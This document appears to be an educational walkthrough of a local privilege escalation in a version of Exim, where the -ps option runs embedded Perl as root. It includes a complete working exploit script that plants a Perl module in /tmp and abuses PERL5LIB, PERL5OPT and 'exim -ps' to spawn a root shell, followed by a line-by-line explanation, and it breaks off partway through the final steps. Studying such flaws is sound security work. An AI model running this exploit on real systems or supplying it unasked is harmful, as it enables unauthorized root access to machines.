In this version of Exim, the -ps option causes Exim to invoke its embedded Perl interpreter,
or in other words the computer would now read and run any Perl code that was part of the command
it was being given, as well as it would do so in a root environment, before dropping privileges.
This meant that Perl environment variables, such as PERL5LIB and PERL5OPT, could now be
passed data that would be allowed to execute, using the -ps option with Exim.
This allows for module injection, where you can:
- Set the PERL5LIB env variable to check in a directory of your choice (PERL5LIB=/tmp)
- Set the PERL5OPT env variable to load a module of your choice
- Use Exim's -ps option to run Perl code as root, which makes the entire attack possible

Combining these two env variables and Exim's -ps option, you can attain arbitrary code
execution, which can allow you to gain a root shell with a simple script,
containing something like system("bin/sh")

## Script that takes advantage of this exploit ##

#!/bin/sh
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps

## Breakdown of script above ##
# First line
Creates a file named root.pm, located in the /tmp directory: (cat > /tmp/root.pm).
The << EOF syntax is saying that the content of root.pm will contain the following lines
and to stop adding lines when EOF is parsed. EOF could be anything, it is simply a signal
to stop adding lines to root.pm

# Next 6 lines
This is the script that will be added to the Perl module root.pm, as well as the signal to
stop adding lines to root.pm (EOF)
The content is a Perl script that spawns a shell via system("/bin/sh") â€” and because it is run
with root privileges, it becomes a root shell.

# Last line is a Linux command:
PERL5LIB=/tmp tells the Perl interpreter to check the /tmp directory for modules, before
        everything else
PERL5OPT=-Mroot injects an invisible command line argument that tells the Perl interpreter to
        run the Perl module /tmp/root.pm
/usr/exim/bin/exim -ps will invoke a Perl interpreter and run everything as root which will
        everything to run in the first place

# Final steps
- One local machine:
        1. Create a file that contains the script above
        2. Make it executable
